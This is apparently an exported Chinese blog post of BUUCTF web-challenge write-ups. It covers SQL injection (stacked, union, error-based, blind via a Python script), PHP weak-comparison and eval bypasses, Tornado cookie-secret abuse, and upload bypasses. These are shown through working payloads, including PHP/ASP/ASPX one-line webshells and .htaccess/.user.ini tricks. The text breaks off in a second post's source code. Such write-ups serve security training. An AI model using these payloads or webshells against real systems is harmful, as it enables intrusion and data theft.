<p>先通过show databases爆出数据库。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里有两个表，我们先尝试爆words表的内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure>

<p>然后报表 1919810931114514 的内容。</p>
<p><strong>表名为数字时，要用反引号包起来查询。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure>

<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，给新 words 表添加新的列名 id 。</p>
<p>4，将 flag 改名为 data 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<p>[ BUUCTF[强网杯 2019]随便注 的三种解法_天问_Herbert555的博客-CSDN博客_[强网杯 2019]随便注](<a href="https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request_id%22:%22167525557716800186572538%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167525557716800186572538&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142%5Ev72%5Einsert_down1,201%5Ev4%5Eadd_ask&utm_term=%5B%E5%BC%BA%E7%BD%91%E6%9D%AF">https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request%5Fid%22%3A%22167525557716800186572538%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167525557716800186572538&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142^v72^insert_down1,201^v4^add_ask&amp;utm_term=[强网杯</a> 2019]随便注&amp;spm&#x3D;1018.2226.3001.4187)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18e9f535-61ab-4cb5-8b24-03fb1b16d853&#125;</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 4#   报错，说明是三列</span><br><span class="line">1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; #</span><br><span class="line">1&#x27; union select group_concat(id),group_concat(username),group_concat(password) from l0ve1ysq1#</span><br></pre></td></tr></table></figure>



<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>dirsearch去扫，扫出来太多了</p>
<p>backupfile可知找备份文件，虽然我是看wp可知，</p>
<p>&#x2F;index.php.bat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>传入key，首先判断key是否为数字或者数字字符。然后对key取整。最后判断key和str是否相等。这里存在弱比较漏洞。<br>原理：如果key为数字时，在做&#x3D;&#x3D;比较时，str<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>自动变为数字，即str&#x3D;123。</p>
<p>flag{a3cf62f3-1704-46dc-b72b-a043c514dbdd}</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a><strong>双写绕过</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/01/buu%E5%90%88%E9%9B%86-buu-web/QQ%E6%88%AA%E5%9B%BE20230511142254.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,3#</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(selselectect group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_name = &#x27;b4bsql&#x27;),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(seselectlect group_concat(passwoorrd) frfromom b4bsql),3 #</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><ol>
<li>一句话木马<code>&lt;?</code>绕过</li>
<li>文件后缀绕过</li>
<li>文件类型<code>Content-Type</code>绕过</li>
</ol>
<p>文件头GIF86a    &#x2F;&#x2F;绕过前端验证</p>
<p>.phtml后缀可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>生成图片木马的系统指令</p>
<p>copy 图片&#x2F;b+一句话木马&#x2F;a 图片木马</p>
<p>这句指令只能够在cmd终端中进行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy pho.jpg /b + hack.php /a hack.jpg</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p>常见的一句话木马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>ASP 文件可包含文本、 HTML 标签和脚本。ASP 文件中的脚本可在服务器上执行。</strong></p>
<p>htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。新建.htaccess文件，编辑内容为SetHandler application&#x2F;x-httpd-php</p>
<p>&#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析</p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="Python的web框架-Tornado"><a href="#Python的web框架-Tornado" class="headerlink" title="Python的web框架-Tornado"></a>Python的web框架-Tornado</h3><p><a href="https://so.csdn.net/so/search?q=tornado&spm=1001.2101.3001.7020">tornado</a>.web.Application对象初始化赋予cookie_secret参数，用于保存本网站cookies加密密钥</p>
<p>&#x2F;hints.txt<br>md5(cookie_secret+md5(filename))</p>
<p>&#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag</p>
<p>&#x2F;welcome.txt<br>render</p>
<p>cookie_secret的值</p>
<p>error?msg&#x3D;</p>
<p>即可查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;f6fcc9c5-389d-4b35-95c9-ceb850ba40a5&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>filename&#x3D;&#x2F;fllllllllllllag   加密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3bf9f6cf685a6dd8defadabfb41a03a1  </span><br></pre></td></tr></table></figure>

<p>拼接md5加密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我扌your problem?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)|| (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">			<span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$target_path</span>), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;我扌your problem?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传一个.htaccess文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>同时修改类型为png</p>
<p>上传成功</p>
<p>接着上传一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a </span><br><span class="line">  &lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p>flag{449ef412-2b10-4498-b258-8e2fcdfd2938}</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chr() — 返回指定的字符</span><br><span class="line">scandir() — 列出指定路径中的文件和目录</span><br><span class="line">var_dump() — 打印变量的相关信息</span><br><span class="line">file_get_contents() — 将整个文件读入一个字符串</span><br><span class="line">foreach 语法结构提供了遍历数组的简单方式。</span><br><span class="line">foreach (array_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (array_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br><span class="line">/i (忽略大小写)</span><br><span class="line">/g (全文查找出现的所有匹配字符)</span><br><span class="line">/m (多行查找)</span><br><span class="line">/gi(全文查找、忽略大小写)</span><br><span class="line">/ig(全文查找、忽略大小写)</span><br></pre></td></tr></table></figure>

<p>payload: 产看目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 等价 var_dump(file_get_contents(&quot;/flagg&quot;))</span><br><span class="line">/calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-HardSQL-报错注入"><a href="#极客大挑战-2019-HardSQL-报错注入" class="headerlink" title="[极客大挑战 2019]HardSQL -报错注入"></a>[极客大挑战 2019]HardSQL -报错注入</h2><p>额，就一个普通的报错注入，但是过滤了and、&#x3D; 空格 union等多个sql关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#  //只查到了左边，我们用right函数</span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>flag{986ccfdc-fbb9-4fba-bb4b-790ddb4a0d63}</p>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>user.ini</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=&quot;1.jpg&quot;</span><br></pre></td></tr></table></figure>

<p>1.jpg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="GXYCTF2019-BabySQli-联合注入"><a href="#GXYCTF2019-BabySQli-联合注入" class="headerlink" title="[GXYCTF2019]BabySQli-联合注入"></a>[GXYCTF2019]BabySQli-联合注入</h2><p>随便输入查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = &#x27;$name&#x27;</span><br></pre></td></tr></table></figure>

<p>题目给的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line">// 去除转义</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">    function stripslashes_deep($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $value = is_array($value) ?</span><br><span class="line">        array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">        stripslashes($value);</span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">    $_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">    $_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">    $_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">    die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (!$result) &#123;</span><br><span class="line">        printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $arr = mysqli_fetch_row($result);</span><br><span class="line">        if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">            if(md5($password) == $arr[2])&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;wrong pass!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;wrong user!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=admin&#x27; Order by 4#</span><br><span class="line">pw=1</span><br><span class="line">回显：Error: Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;.</span><br><span class="line"></span><br><span class="line">name=admin&#x27; Order by 3#</span><br><span class="line">pw=1</span><br><span class="line">回显：wrong pass</span><br></pre></td></tr></table></figure>

<p>字段为3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#</span><br><span class="line">passwd=1</span><br></pre></td></tr></table></figure>

<p>c4ca4238a0b923820dcc509a6f75849b为md5 加密后的1</p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>All You Want Is In Table ‘flag’ and the column is ‘flag’</p>
<p>Now, just give the id of passage</p>
<p>这道题对爆破有限制</p>
<p>采用延时爆破，bp延时fuzz一下</p>
<p>根据提示可以知道flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#whited by zhou</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://80d573a7-5e74-4238-b99e-da083c3a0314.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    i = i + 1</span><br><span class="line">    while head&lt;tail:</span><br><span class="line">        mid = (head + tail) // 2</span><br><span class="line">        payload = f&quot;if(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload,</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        if &quot;Hello&quot; in r.text:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    result += chr(head)</span><br><span class="line">    if &#x27;&#125;&#x27; in result:</span><br><span class="line">      break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>xx9nGK&amp;2t</p>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu2</title>
    <url>/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/</url>
    <content><![CDATA[<p>buu第二页</p>
 <span id="more"></span>

<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>访问robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



